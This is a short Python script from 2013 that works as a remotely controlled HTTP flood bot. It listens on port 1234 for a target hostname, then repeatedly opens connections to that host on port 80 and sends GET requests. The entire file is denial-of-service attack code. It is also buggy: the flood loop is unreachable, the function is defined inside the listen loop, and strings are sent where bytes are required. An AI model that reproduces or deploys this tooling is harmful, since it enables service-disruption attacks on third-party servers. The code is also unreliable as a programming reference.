#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:
#
# Author:      pat
#
# Created:     13/06/2013
# Copyright:   (c) pat 2013
# Licence:     <your licence>
#------------------------------------------- =------------------------------------

import socket
import os
import re

host = ''
port = 1234
backlog = 5
size = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(port)
while 1:
    client, address = s.accept()
    data = client.recv(size)
    if data:
        data3 = repr(data)

        data2 = re.sub("b", "", data3)
        data4 = re.sub("'", "", data2)

        #print (data4) for debuuging

    client.close()
    def HTTPFlood():
        #pid = os.fork()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock .connect((data4, 80))
        sock.send("GET / HTTP/1.1\r\n")
        sock.send("Host: localhost\r\n\r\n");
        sock.close()
for i in range(1, 500):
    HTTPFlood()